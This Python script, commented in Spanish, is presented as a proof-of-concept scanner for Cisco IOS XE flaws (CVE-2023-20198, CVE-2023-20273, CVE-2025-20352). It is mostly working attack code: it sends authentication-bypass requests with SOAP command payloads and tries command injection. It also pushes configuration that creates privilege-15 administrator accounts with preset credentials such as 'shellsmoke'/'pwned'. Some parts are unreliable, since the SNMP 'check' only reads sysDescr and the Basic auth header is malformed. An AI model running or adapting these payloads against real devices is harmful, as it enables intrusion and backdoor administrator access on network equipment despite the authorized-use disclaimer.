#!/usr/bin/env python3
"""
Cisco ASA/IOS XE Vulnerability POC Scanner
CVE-2023-20198, CVE-2023-20273, CVE-2025-20352
Uso exclusivo para pruebas de seguridad autorizadas y entornos controlados.
"""

import requests
import argparse
import sys
import urllib3
from typing import Optional, Tuple
import socket
import struct
from pysnmp.hlapi import *
import time

# Suprimir warnings de SSL para entornos de prueba
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CiscoVulnScanner:
    def __init__(self, target: str, https: bool = False, timeout: int = 10):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.protocol = "https" if https else "http"
        self.base_url = f"{self.protocol}://{self.target}"
        
    def check_cve_2023_20198(self) -> Tuple[bool, str]:
        """
        Check CVE-2023-20198 - Authentication Bypass in Web UI
        Técnica: Bypass mediante path traversal con encoding doble
        Referencia: PoC público horizon3ai
        """
        print(f"[*] Probando CVE-2023-20198 en {self.target}")
        
        # Paths de bypass conocidos
        paths = [
            "/%2577eb%2575i_%2577sma_Http",  # webui_wsma_httр con doble encoding
            "/webui/?g=aaa_login&lang=;echo%20CVE-2023-20198;",  # Command injection attempt
        ]
        
        # SOAP payload para execCLI
        soap_payload = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<request correlator="show version" xmlns="urn:cisco:wsma-exec">
    <execCLI>
        <cmd>show version</cmd>
        <dialogue>
            <expect></expect>
            <reply></reply>
        </dialogue>
    </execCLI>
</request>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""
        
        headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": "\"\"",
            "User-Agent": "Mozilla/5.0 (compatible; Cisco-POC/1.0)"
        }
        
        for path in paths:
            try:
                url = f"{self.base_url}{path}"
                response = requests.post(url, data=soap_payload, headers=headers, 
                                       verify=False, timeout=self.timeout)
                
                # Buscar indicadores de éxito en respuesta
                if "Cisco IOS Software" in response.text or "Version" in response.text:
                    return True, f"Vulnerable detectado con path: {path}\nVersión: {response.text[:200]}"
                    
            except requests.exceptions.Timeout:
                continue
            except Exception as e:
                continue
                
        return False, "No vulnerable o no detectable"
    
    def check_cve_2023_20273(self, username: str = "shellsmoke", password: str = "pwned") -> Tuple[bool, str]:
        """
        Check CVE-2023-20273 - Privilege Escalation to root
        Requiere credenciales previas de privilege 15
        """
        print(f"[*] Probando CVE-2023-20273 en {self.target}")
        
        # Payload para escalación a root mediante inyección de comandos
        injection_payload = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<request correlator="cmd" xmlns="urn:cisco:wsma-config">
    <configApply>
        <config-data>
            <cli-config-data>
                <cmd>username {0} privilege 15 password {1}</cmd>
                <cmd>ip http server</cmd>
                <cmd>end</cmd>
            </cli-config-data>
        </config-data>
    </configApply>
</request>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>""".format(username, password)
        
        try:
            url = f"{self.base_url}/webui/wsma_http"
            headers = {
                "Content-Type": "text/xml; charset=utf-8",
                "Authorization": f"Basic {username}:{password}",
                "SOAPAction": "\"\""
            }
            
            response = requests.post(url, data=injection_payload, headers=headers,
                                   verify=False, timeout=self.timeout)
            
            if response.status_code == 200 and "success" in response.text.lower():
                return True, f"Posible escalación exitosa. Usuario {username}:{password} creado"
                
        except Exception as e:
            pass
            
        return False, "No vulnerable"
    
    def check_cve_2025_20352(self, community: str = "public") -> Tuple[bool, str]:
        """
        Check CVE-2025-20352 - SNMP Stack Overflow
        Nota: POC basado en análisis de Censys
        """
        print(f"[*] Probando CVE-2025-20352 en {self.target}")
        
        try:
            # Verificar si SNMP está expuesto
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            
            # OID de prueba (system.sysDescr)
            oid = ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0)
            
            errorIndication, errorStatus, errorIndex, varBinds = next(
                getCmd(SnmpEngine(),
                       CommunityData(community),
                       UdpTransportTarget((self.target, 161), timeout=self.timeout),
                       ContextData(),
                       ObjectType(oid))
            )
            
            if errorIndication:
                return False, f"SNMP no accesible: {errorIndication}"
                
            # Extraer información del sistema
            for varBind in varBinds:
                return True, f"SNMP accesible - Posible vulnerable: {varBind}"
                
        except Exception as e:
            return False, f"Error: {str(e)}"
            
        return False, "No vulnerable detectable"
    
    def add_test_user(self, username: str = "testuser", password: str = "Test123!") -> bool:
        """
        Intento de creación de usuario (solo para validación en entornos autorizados)
        """
        print(f"[!] Intentando crear usuario {username} para verificar vulnerabilidad")
        
        soap_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<request xmlns="urn:cisco:wsma-config">
    <configApply>
        <config-data>
            <cli-config-data>
                <cmd>username {username} privilege 15 password {password}</cmd>
            </cli-config-data>
        </config-data>
    </configApply>
</request>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""
        
        try:
            url = f"{self.base_url}/webui/wsma_http"
            headers = {
                "Content-Type": "text/xml; charset=utf-8",
                "SOAPAction": "\"\""
            }
            
            response = requests.post(url, data=soap_payload, headers=headers,
                                   verify=False, timeout=self.timeout)
            
            return response.status_code == 200
            
        except:
            return False

def main():
    parser = argparse.ArgumentParser(description='Cisco ASA/IOS XE Vulnerability Scanner')
    parser.add_argument('-t', '--target', required=True, help='Target IP or hostname')
    parser.add_argument('--https', action='store_true', help='Use HTTPS')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout in seconds')
    parser.add_argument('--check-all', action='store_true', help='Check all vulnerabilities')
    parser.add_argument('--cve-20198', action='store_true', help='Check CVE-2023-20198')
    parser.add_argument('--cve-20273', action='store_true', help='Check CVE-2023-20273')
    parser.add_argument('--cve-20352', action='store_true', help='Check CVE-2025-20352')
    parser.add_argument('--username', default='shellsmoke', help='Username for auth checks')
    parser.add_argument('--password', default='pwned', help='Password for auth checks')
    parser.add_argument('--community', default='public', help='SNMP community string')
    
    args = parser.parse_args()
    
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║     Cisco ASA/IOS XE Vulnerability POC Scanner           ║
    ║     CVE-2023-20198 | CVE-2023-20273 | CVE-2025-20352     ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    print("[!] ADVERTENCIA: Uso exclusivo para pruebas de seguridad autorizadas")
    print("[!] El uso no autorizado puede ser ilegal\n")
    
    scanner = CiscoVulnScanner(args.target, args.https, args.timeout)
    
    results = []
    
    if args.check_all or args.cve_20198:
        vulnerable, details = scanner.check_cve_2023_20198()
        status = "VULNERABLE" if vulnerable else "NO DETECTADO"
        results.append(f"CVE-2023-20198: {status}\n{details}")
        
    if args.check_all or args.cve_20273:
        vulnerable, details = scanner.check_cve_2023_20273(args.username, args.password)
        status = "VULNERABLE" if vulnerable else "NO DETECTADO"
        results.append(f"CVE-2023-20273: {status}\n{details}")
        
    if args.check_all or args.cve_20352:
        vulnerable, details = scanner.check_cve_2025_20352(args.community)
        status = "VULNERABLE" if vulnerable else "NO DETECTADO"
        results.append(f"CVE-2025-20352: {status}\n{details}")
    
    print("\n" + "="*50)
    print("RESULTADOS DEL SCAN")
    print("="*50)
    
    for result in results:
        print(f"\n{result}")
        print("-"*30)

if __name__ == "__main__":
    main()
